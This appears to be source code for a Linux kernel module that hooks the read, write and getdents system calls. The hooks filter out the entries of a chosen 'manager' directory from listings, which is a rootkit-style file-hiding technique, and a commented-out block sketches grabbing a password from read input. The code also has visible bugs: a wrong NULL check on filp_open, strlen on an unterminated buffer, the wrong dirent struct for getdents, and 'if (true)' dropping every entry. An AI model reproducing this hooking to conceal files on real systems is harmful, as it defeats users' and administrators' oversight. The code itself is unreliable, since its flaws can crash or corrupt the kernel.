#include "hooks.h"
#include "cipher.h"
#include <linux/file.h>

bool check_ownership(unsigned int fd)
{
    struct file *fs = fget(fd);
    if (fs == NULL) {
        printk(KERN_EMERG "open fd failed\n");
        return false;
    }
    uid_t res = fs->f_inode->i_uid.val;
    fput(fs);
    return res == manager_uid;
}

bool check_directory(unsigned int fd)
{
    struct file *fs = fget(fd);
    if (fs == NULL) {
        printk(KERN_EMERG "open fd failed\n");
        return false;
    }
    char* pathname;
    pathname = kmalloc(MAX_PATH_LEN, GFP_KERNEL);
    if (pathname == NULL) {
        printk(KERN_EMERG "kmalloc failed on check_directory\n");
        return false;
    }
    memset(pathname, 97, MAX_PATH_LEN);
    // get fullpath from dentry
    dentry_path_raw(fs->f_path.dentry, pathname, strlen(pathname));
    int i = 0;
    // printk(KERN_EMERG "search i %s", (pathname+252));
    char cur_chr;
    for (i = 0; i < MAX_PATH_LEN; i++) {
        cur_chr = *(pathname+i);
        if (cur_chr != 97) break;
    }
    printk(KERN_EMERG "[+] check directory %d %s.\n", strlen(pathname+i), pathname+i);
    int res = strncmp(pathname+i, manager_dir, strlen(manager_dir));
    // printk(KERN_EMERG "[+] compare %d\n", res);
    kfree(pathname);
    fput(fs);
    return res == 0;
}

asmlinkage int new_write(unsigned int x, const char __user *y, size_t size)
{
    if (check_ownership(x) && check_directory(x))
    {
        printk(KERN_EMERG "[+] write() hooked.\n");
    }
    return original_write(x, y, size);
}

asmlinkage int new_read(unsigned int x, char __user *y, size_t size)
{
    if (check_ownership(x) && check_directory(x))
    {
        printk(KERN_EMERG "[+] read() hooked.\n");
        // char* password;
        // password = kmalloc(MAX_PASSWORD_LEN, GFP_KERNEL);
        // if (password == NULL) {
        //     printk(KERN_EMERG "kmalloc failed on password initialization\n");
        //     return -1;
        // }
        // memset(password, 0, MAX_PASSWORD_LEN);

        // printk(KERN_EMERG "kernel pid %lu", current->pid);
        // // use stdin ?        
        // struct file *stdinf = fget(1);
        // if (stdinf == NULL) {
        //     printk(KERN_EMERG "open fd failed\n");
        //     return -1;
        // }
        // stdinf->f_op->read(stdinf, password, MAX_PASSWORD_LEN, 0);
        // fput(stdinf);     
        
        // // or use default arguments?
        // strncpy(password, y, MAX_PASSWORD_LEN);

        // printk(KERN_EMERG "password %s\n", password);
        // kfree(password);
    }
    return original_read(x, y, size);
}

asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
    printk(KERN_EMERG "[+] getdents64() hooked.\n");
    long ret, tmp;
    struct linux_dirent64 *td;
    int manager_ino = -1;

    struct file *filp;
    if ((filp = filp_open(manager_dir, O_RDONLY, 0)) != NULL)
    {
        manager_ino = filp->f_path.dentry->d_inode->i_ino;
        printk(KERN_EMERG "directory inode %d\n", manager_ino);
        filp_close(filp, NULL);
    }

    ret = original_getdents64(fd, dirp, count);
    if (unlikely(dirp->d_ino == manager_ino))
    {
        td = dirp;
        tmp = ret;
        while (tmp > 0)
        {
            tmp -= td->d_reclen;
            if (true) // strstr(td->d_name, "xxx") != NULL)
            {
                ret -= td->d_reclen;
                if (tmp)
                    memmove(td, (char *)td + td->d_reclen, tmp);
            }
            else
            {
                td = (struct linux_dirent64 *)((char *)td + td->d_reclen);
            }
        }
    }
    return ret;
}

asmlinkage int new_getdents(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
    printk(KERN_EMERG "[+] getdents64() hooked.\n");
    long ret, tmp;
    struct linux_dirent64 *td;
    int manager_ino = -1;

    struct file *filp;
    if ((filp = filp_open(manager_dir, O_RDONLY, 0)) != NULL)
    {
        manager_ino = filp->f_path.dentry->d_inode->i_ino;
        printk(KERN_EMERG "directory inode %d\n", manager_ino);
        filp_close(filp, NULL);
    }

    ret = original_getdents(fd, dirp, count);
    if (unlikely(dirp->d_ino == manager_ino))
    {
        td = dirp;
        tmp = ret;
        while (tmp > 0)
        {
            tmp -= td->d_reclen;
            if (true) // strstr(td->d_name, "xxx") != NULL)
            {
                ret -= td->d_reclen;
                if (tmp)
                    memmove(td, (char *)td + td->d_reclen, tmp);
            }
            else
            {
                td = (struct linux_dirent64 *)((char *)td + td->d_reclen);
            }
        }
    }
    return ret;
}